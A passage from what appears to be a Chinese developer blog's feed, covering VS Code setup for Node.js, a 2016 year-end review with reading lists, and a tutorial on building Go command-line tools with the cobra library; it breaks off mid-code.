<li><p>在目录(在这里是<code>NodeSnippet</code>文件夹中)增加一个名为<code>jsconfig.json</code>的空文件</p>
</li>
</ol>
<p>更多jsconfig.json文件的内容可以参考： <a href="https://code.visualstudio.com/Docs/languages/javascript" target="_blank" rel="external">JavaScript in VS Code</a></p>
<p>这样我们写代码的时候就有智能提示功能了， 效果如下:<br><img src="http://oiw1gzfww.bkt.clouddn.com/nodejs_vscode.gif" alt=""></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>如何调试写好了的JS程序喃？</p>
<p>用VS Code快速创建launch.json文件, 主要是修改program这个参数，指明你 可执行文件位置。</p>
<p>关于Debug的细节，请参考<a href="https://go.microsoft.com/fwlink/?linkid=830387" target="_blank" rel="external">Debugging</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="comment">// Use IntelliSense to learn about possible Node.js debug attributes.</span></div><div class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></div><div class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></div><div class="line">    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</div><div class="line">    <span class="string">"configurations"</span>: [</div><div class="line">        &#123;</div><div class="line">            <span class="string">"type"</span>: <span class="string">"node"</span>,</div><div class="line">            <span class="string">"request"</span>: <span class="string">"launch"</span>,</div><div class="line">            <span class="string">"name"</span>: <span class="string">"启动程序"</span>,</div><div class="line">            <span class="string">"program"</span>: <span class="string">"$&#123;workspaceRoot&#125;/app.js"</span>,</div><div class="line">            <span class="string">"cwd"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span></div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            <span class="string">"type"</span>: <span class="string">"node"</span>,</div><div class="line">            <span class="string">"request"</span>: <span class="string">"attach"</span>,</div><div class="line">            <span class="string">"name"</span>: <span class="string">"附加到进程"</span>,</div><div class="line">            <span class="string">"port"</span>: <span class="number">5858</span></div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>效果如下:<br><img src="http://oiw1gzfww.bkt.clouddn.com/nodejs_vscode_debug.gif" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="JavaScript" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/JavaScript/"/>
    
    
      <category term="vscode" scheme="https://blog.yumaojun.net/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>2016总结与2017计划</title>
    <link href="https://blog.yumaojun.net/2016/12/31/2016-summary/"/>
    <id>https://blog.yumaojun.net/2016/12/31/2016-summary/</id>
    <published>2016-12-31T12:03:29.000Z</published>
    <updated>2017-01-02T15:32:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。</p>
<p>记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。</p>
<a id="more"></a>
<h2 id="转瞬即逝的2016"><a href="#转瞬即逝的2016" class="headerlink" title="转瞬即逝的2016"></a>转瞬即逝的2016</h2><p>2016是繁忙的一年，工作上处处充满挑战，有些挑战是自己喜欢的，有些挑战也是自己比较抵触的，我喜欢开发，从运维开发转而参与大型系统开发，这的确是一个不小的挑战，我是一个对技术有点激情的人，因此这个挑战对我而言还是比较喜欢的。后来同时做起了产品设计, 每天扣脑袋, 看别人的产品，画产品设计图， 这些在当时的我是很抵触的, 当时我还处于单纯的想积累技术的阶段。现在看来这段经历也是我宝贵的财富, 毕竟产品决定东西的价值，用再牛叉的技术,做一个没有价值的东西, 这是一件愚蠢的行为，我这里说的价值是长远价值，而不是当下看起来有价值, 这个说起来很悬，以后有机会深入讨论这个。</p>
<p>2016这一年也在和JumpServer一同成长的一年，感触也蛮多的，首先是技术的成长，一个开源产品的技术的迭代，我们致力于设计NB的产品和写出漂亮的代码。其次为有可能的融资谈判而兴奋过，然而最后还是平静下来, 慢慢做一个自己认可的能力范围之内的产品。</p>
<p>工作上的事儿, 总是有那么点紧绷, 其实生活上也有很多值得高兴的事儿，我们有了自己的房子，并且搬进去了，告别了租房的日子，这一切多谢我的老婆打理，我基本是啥心都没操过。其次，我女儿和我关系也很不错，虽然她生气的时候只找她妈妈，但是我在她心中的地位也仅次于她妈妈，我也心有愧疚，作为一个父亲我陪伴她的时候是有点少了。还有我的好搭档，在我最需要钱的时候, 一身不吭的直接转我支付宝上,人生中能交到一个这样的朋友，是我的莫大的荣幸。</p>
<p>还有一个事儿，我终于用上Mac了，虽然是一个二手的MBP，但是这对满足一个屌丝的虚荣心完全受用了, 说岔了, 我再也不用在Windows上装Ubuntu开发了。</p>
<h2 id="瞬息万变的2017"><a href="#瞬息万变的2017" class="headerlink" title="瞬息万变的2017"></a>瞬息万变的2017</h2><p>变化和革新是很快的, 比如OpenStack没有那么热了, 容器技术也基本成了开发的必备技能, 无论你作为一个前端开发还是后端开发JavaScript都快成为一门必备语言了。前后端的完全分离也愈演愈烈, 各种前段框架的变化。<br>伴随而来的是微服务+容器技术的紧密结合。在最后DDD也随着微服务的出现，对开发人员提出了更高的需求, 以后那种只会写代码的人将愈来愈少了。</p>
<p>我Hold不住这些，因此在技术方面我仅能列出我需要提升的书单:</p>
<h3 id="Python提升书单-今年主力"><a href="#Python提升书单-今年主力" class="headerlink" title="Python提升书单(今年主力)"></a>Python提升书单(今年主力)</h3><ol>
<li>基础回过<ul>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="external">廖雪峰官网</a></li>
<li>Think Python 2ed 中译版精校  PDF 电子书</li>
</ul>
</li>
<li>进阶深<ul>
<li><a href="http://python3-cookbook.readthedocs.io/zh_CN/latest/preface.html" target="_blank" rel="external">python3-cookbook</a></li>
<li>电子书Python高手之路</li>
</ul>
</li>
<li>常见的一些代码实现<ul>
<li><a href="https://github.com/liquanzhou/ops_doc/blob/master/python%E5%AE%9E%E4%BE%8B%E6%89%8B%E5%86%8C.py" target="_blank" rel="external">python实例手册</a>  </li>
<li><a href="https://segmentfault.com/t/python/blogs" target="_blank" rel="external">网站上的文章</a></li>
</ul>
</li>
<li>设计模式<ul>
<li><a href="http://www.cnblogs.com/wuyuegb2312/archive/2013/04/09/3008320.html" target="_blank" rel="external">快速版大话设计模式</a></li>
<li><a href="https://github.com/faif/python-patterns" target="_blank" rel="external">一些最新的例子</a></li>
<li><a href="http://www.ituring.com.cn/book/1715" target="_blank" rel="external">精通Python设计模式</a></li>
</ul>
</li>
<li>数据结构与算法<ul>
<li><a href="http://top.jobbole.com/4681/" target="_blank" rel="external">快速阅读总结</a></li>
<li>电子书：Data Structures and Algorithms with Python-2015</li>
</ul>
</li>
<li>源码阅读<ul>
<li>Django Class Based View </li>
<li>Flask 源码阅读</li>
<li>Openstack KeyStone 源码阅读</li>
</ul>
</li>
<li>理解Python解释器<ul>
<li><a href="http://mt.sohu.com/20161030/n471778650.shtml" target="_blank" rel="external">用Python实现一个Python解释器</a></li>
</ul>
</li>
</ol>
<h3 id="Golang提升书单"><a href="#Golang提升书单" class="headerlink" title="Golang提升书单"></a>Golang提升书单</h3><ol>
<li>回过基础：<ul>
<li><a href="http://mt.sohu.com/20161030/n471778650.shtml" target="_blank" rel="external">Go Web 编程</a></li>
<li><a href="https://hotsnow.gitbooks.io/the-way-to-go_zh_cn/content/" target="_blank" rel="external">Go入门指南</a></li>
</ul>
</li>
</ol>
<h3 id="JavaScript提升书单"><a href="#JavaScript提升书单" class="headerlink" title="JavaScript提升书单"></a>JavaScript提升书单</h3><ol>
<li>回过基础：<ul>
<li><a href="http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000" target="_blank" rel="external">廖雪峰官网</a></li>
<li><a href="http://javascript.ruanyifeng.com/#nodejs" target="_blank" rel="external">阮一峰的javascript教程 </a></li>
<li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="external">ECMAScript 6 入门</a></li>
</ul>
</li>
</ol>
<p>除了技术, 还应该有生活。而生活就是: <strong><em>赶紧把账还完</em></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。&lt;/p&gt;
&lt;p&gt;记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。&lt;/p&gt;
    
    </summary>
    
      <category term="杂谈" scheme="https://blog.yumaojun.net/categories/%E6%9D%82%E8%B0%88/"/>
    
      <category term="年终总结" scheme="https://blog.yumaojun.net/categories/%E6%9D%82%E8%B0%88/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="summary" scheme="https://blog.yumaojun.net/tags/summary/"/>
    
  </entry>
  
  <entry>
    <title>如何使用golang编写漂亮的命令行工具</title>
    <link href="https://blog.yumaojun.net/2016/12/30/go-cobra/"/>
    <id>https://blog.yumaojun.net/2016/12/30/go-cobra/</id>
    <published>2016-12-30T01:08:22.000Z</published>
    <updated>2017-01-06T06:18:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra<br><a id="more"></a></p>
<h2 id="cobra简介"><a href="#cobra简介" class="headerlink" title="cobra简介"></a>cobra简介</h2><p>Cobra既是一个用来创建强大的现代CLI命令行的golang库，也是一个生成程序应用和命令行文件的程序。<br>它提供的功能有：</p>
<ul>
<li>简易的子命令行模式，如 app server， app fetch等等</li>
<li>完全兼容posix命令行模式</li>
<li>嵌套子命令subcommand</li>
<li>支持全局，局部，串联flags</li>
<li>使用Cobra很容易的生成应用程序和命令，使用cobra create appname和cobra add cmdname</li>
<li>如果命令输入错误，将提供智能建议，如 app srver，将提示srver没有，是否是app server</li>
<li>自动生成commands和flags的帮助信息</li>
<li>自动生成详细的help信息，如app help</li>
<li>自动识别-h，–help帮助flag</li>
<li>自动生成应用程序在bash下命令自动完成功能</li>
<li>自动生成应用程序的man手册</li>
<li>命令行别名</li>
<li>自定义help和usage信息</li>
<li>可选的紧密集成的viper apps</li>
</ul>
<p>从功能上看完全超越了argparse， 下面将做一个简单的测试，体验下cobra的强大</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装cobra需要翻墙，我的环境是Mac，使用ss + polipo来提供https的方向代理。我的代理端口在8123,所以命令行是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$https_proxy</span>=localhost:8123 go get -v github.com/spf13/cobra/cobra</div></pre></td></tr></table></figure></p>
<p>安装完成后可以看到cobra的一些帮助信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ cobra -h</div><div class="line">Cobra is a CLI library <span class="keyword">for</span> Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.</div><div class="line"></div><div class="line">Usage:</div><div class="line">  cobra [<span class="built_in">command</span>]</div><div class="line"></div><div class="line">Available Commands:</div><div class="line">  add         Add a <span class="built_in">command</span> to a Cobra Application</div><div class="line">  init        Initialize a Cobra Application</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --author string        Author name <span class="keyword">for</span> copyright attribution (default <span class="string">"YOUR NAME"</span>)</div><div class="line">      --config string        config file (default is <span class="variable">$HOME</span>/.cobra.yaml)</div><div class="line">  <span class="_">-l</span>, --license license      Name of license <span class="keyword">for</span> the project (can provide license <span class="keyword">in</span> config)</div><div class="line">  -b, --projectbase string   base project directory, e.g. github.com/spf13/</div><div class="line">      --viper                Use Viper <span class="keyword">for</span> configuration (default <span class="literal">true</span>)</div><div class="line"></div><div class="line">Use <span class="string">"cobra [command] --help"</span> <span class="keyword">for</span> more information about a command.</div></pre></td></tr></table></figure></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来将使用cobra构建一个不带子命令的CLI和带子命令的CLI</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>我们可以通过cobra提供的init命令来生成CLI的框架代码，因此切换到GOPATH/src下面,初始CLI框架<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ cobra init demo</div><div class="line">Your Cobra application is ready at</div><div class="line">/Users/maojun/GoWorkDir/src/demo</div><div class="line">Give it a try by going there and running `go run main.go`</div><div class="line">Add commands to it by running `cobra add [cmdname]`</div></pre></td></tr></table></figure></p>
<p>这个命令会帮你生成这样一个框架代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> maojun@maojun-mbp$ tree demo</div><div class="line">demo</div><div class="line">├── LICENSE</div><div class="line">├── cmd</div><div class="line">│   └── root.go</div><div class="line">└── main.go</div></pre></td></tr></table></figure></p>
<h3 id="简单的CLI"><a href="#简单的CLI" class="headerlink" title="简单的CLI"></a>简单的CLI</h3><p>在写一些简单的CLI的时候我们其实是不需要有子命令的，我们往往需要这样一种简单的CLI<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">demo.exe</div><div class="line">Demo is a <span class="built_in">test</span> appcation <span class="keyword">for</span> <span class="built_in">print</span> things</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [flags]</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -h, --help          help for demo</div><div class="line">  -n, --name string   person's name</div></pre></td></tr></table></figure></p>
<p>接下来我们就在上面生成的代码的基础上完成一个不带子命令的CLI。首先，我需要编写我的业务逻辑，因此我在demo下面新建一个包，名称为simple。如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ tree .</div><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── cmd</div><div class="line">│   └── root.go</div><div class="line">├── main.go</div><div class="line">└── simple</div><div class="line">    ├── simple.go</div><div class="line">    └── simple_test.go</div></pre></td></tr></table></figure></p>
<p>这里仅仅实现一个print作为样例,因此simple.go是这样实现的<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> simple</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Show</span><span class="params">(name <span class="keyword">string</span>, age <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">    fmt.Printf(<span class="string">"My name is %s, my age is %d\n"</span>, name, age)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接下来我们需要将我们实行的整个Show方法暴露给CLI, 我们从生成的main文件入手分析。</p>
<ol>
<li>在main里面调用了 demo/cmd包里面暴露的Execute 函数 [cmd.Execute()]</li>
<li>在demo/cmd/root.go中发现Execute执行的是RootCmd.Execute()</li>
<li>而RootCmd是一个cobra的Command结构体[RootCmd = &amp;cobra.Command]<br>显然我们想要实行不带子命令的CLI，只需要将RootCmd的修改成我们需要的结构体就ok了</li>
</ol>
<p>这里做了几点修改</p>
<ol>
<li>RootCmd中的Command结构体中的Run方法需要我们定义， 主要功能就是调用simple里面的Show接口</li>
<li>cmd包初始化得时候需要通过RootCmd.Flags()获取命令行传入的name和age的参数，因此这里需要修改init方法</li>
<li>最后我们不需要从配置文件读取配置，注释掉：nitConfig函数和”github.com/spf13/viper”</li>
</ol>
<p>最终这个root.go是这样的<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the "License");</span></div><div class="line"><span class="comment">// you may not use this file except in compliance with the License.</span></div><div class="line"><span class="comment">// You may obtain a copy of the License at</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//     http://www.apache.org/licenses/LICENSE-2.0</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Unless required by applicable law or agreed to in writing, software</span></div><div class="line"><span class="comment">// distributed under the License is distributed on an "AS IS" BASIS,</span></div><div class="line"><span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class="line"><span class="comment">// See the License for the specific language governing permissions and</span></div><div class="line"><span class="comment">// limitations under the License.</span></div><div class="line"></div><div class="line"><span class="keyword">package</span> cmd</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line"></div><div class="line">	<span class="string">"demo/simple"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/spf13/cobra"</span></div><div class="line">	<span class="comment">// "github.com/spf13/viper"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">//var cfgFile string</span></div><div class="line"><span class="keyword">var</span> name <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> age <span class="keyword">int</span></div><div class="line"></div><div class="line"><span class="comment">// RootCmd represents the base command when called without any subcommands</span></div><div class="line"><span class="keyword">var</span> RootCmd = &amp;cobra.Command&#123;</div><div class="line">	Use:   <span class="string">"demo"</span>,</div><div class="line">	Short: <span class="string">"A test demo"</span>,</div><div class="line">	Long: <span class="string">`Demo is a test appcation for print things`</span>,</div><div class="line"><span class="comment">// Uncomment the following line if your bare application</span></div><div class="line"><span class="comment">// has an action associated with it:</span></div><div class="line">	Run: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">0</span> &#123;</div><div class="line">			cmd.Help()</div><div class="line">			<span class="keyword">return</span></div><div class="line">		&#125;</div><div class="line">		simple.Show(name, age)</div><div class="line">	&#125;,</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Execute adds all child commands to the root command sets flags appropriately.</span></div><div class="line"><span class="comment">// This is called by main.main(). It only needs to happen once to the rootCmd.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Execute</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> err := RootCmd.Execute(); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">		os.Exit(<span class="number">-1</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// cobra.OnInitialize(initConfig)</span></div><div class="line"></div><div class="line">	<span class="comment">// Here you will define your flags and configuration settings.</span></div><div class="line">	<span class="comment">// Cobra supports Persistent Flags, which, if defined here,</span></div><div class="line">	<span class="comment">// will be global for your application.</span></div><div class="line"></div><div class="line">	<span class="comment">// RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)")</span></div><div class="line">	<span class="comment">// Cobra also supports local flags, which will only run</span></div><div class="line">	<span class="comment">// when this action is called directly.</span></div><div class="line">	<span class="comment">// RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")</span></div><div class="line"></div><div class="line">	RootCmd.Flags().StringVarP(&amp;name, <span class="string">"name"</span>, <span class="string">"n"</span>, <span class="string">""</span>, <span class="string">"persion's name"</span>)</div><div class="line">	RootCmd.Flags().IntVarP(&amp;age, <span class="string">"age"</span>, <span class="string">"a"</span>, <span class="number">0</span>, <span class="string">"person's age"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// // initConfig reads in config file and ENV variables if set.</span></div><div class="line"><span class="comment">// func initConfig() &#123;</span></div><div class="line"><span class="comment">// 	if cfgFile != "" &#123; // enable ability to specify config file via flag</span></div><div class="line"><span class="comment">// 		viper.SetConfigFile(cfgFile)</span></div><div class="line"><span class="comment">// 	&#125;</span></div><div class="line"></div><div class="line"><span class="comment">// 	viper.SetConfigName(".demo") // name of config file (without extension)</span></div><div class="line"><span class="comment">// 	viper.AddConfigPath("$HOME")  // adding home directory as first search path</span></div><div class="line"><span class="comment">// 	viper.AutomaticEnv()          // read in environment variables that match</span></div><div class="line"></div><div class="line"><span class="comment">// 	// If a config file is found, read it in.</span></div><div class="line"><span class="comment">// 	if err := viper.ReadInConfig(); err == nil &#123;</span></div><div class="line"><span class="comment">// 		fmt.Println("Using config file:", viper.ConfigFileUsed())</span></div><div class="line"><span class="comment">// 	&#125;</span></div><div class="line"><span class="comment">// &#125;</span></div></pre></td></tr></table></figure></p>
<p>最后测试下是不是我们想要的效果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ go run main.go -h</div><div class="line">Demo is a <span class="built_in">test</span> appcation <span class="keyword">for</span> <span class="built_in">print</span> things</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [flags]</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -n, --name string   persion's name</div><div class="line">maojun@maojun-mbp$ go run main.go -n <span class="string">"test"</span> <span class="_">-a</span> 10</div><div class="line">My name is <span class="built_in">test</span>, my age is 10</div></pre></td></tr></table></figure></p>
<h3 id="带子命令的CLI"><a href="#带子命令的CLI" class="headerlink" title="带子命令的CLI"></a>带子命令的CLI</h3><p>对于复杂的情况，往往需要带子命令场景，比如Docker的CLI，而最终的效果应该是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">demo</div><div class="line">Demo is a <span class="built_in">test</span> appcation <span class="keyword">for</span> <span class="built_in">print</span> things</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [flags]</div><div class="line">  demo [<span class="built_in">command</span>]</div><div class="line"></div><div class="line">Available Commands:</div><div class="line">  <span class="built_in">test</span>        A brief description of your <span class="built_in">command</span></div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -h, --help          help for demo</div><div class="line">  -n, --name string   person's name</div><div class="line"></div><div class="line">Use <span class="string">"demo [command] --help"</span> <span class="keyword">for</span> more information about a command.</div></pre></td></tr></table></figure></p>
<p>支持子命令是cobra的自己的功能，因此直接可以通过cobra生成带子命令的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ cobra init demo</div><div class="line">Your Cobra application is ready at</div><div class="line">/Users/maojun/GoWorkDir/src/demo</div><div class="line">Give it a try by going there and running `go run main.go`</div><div class="line">Add commands to it by running `cobra add [cmdname]`</div><div class="line"></div><div class="line">maojun@maojun-mbp$ cobra add <span class="built_in">test</span></div><div class="line"><span class="built_in">test</span> created at /Users/maojun/GoWorkDir/src/cmd/test.go</div></pre></td></tr></table></figure></p>
<p>注释掉root.go那些不需要的地方, 然后修改生成的test.go<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the "License");</span></div><div class="line"><span class="comment">// you may not use this file except in compliance with the License.</span></div><div class="line"><span class="comment">// You may obtain a copy of the License at</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//     http://www.apache.org/licenses/LICENSE-2.0</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Unless required by applicable law or agreed to in writing, software</span></div><div class="line"><span class="comment">// distributed under the License is distributed on an "AS IS" BASIS,</span></div><div class="line"><span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class="line"><span 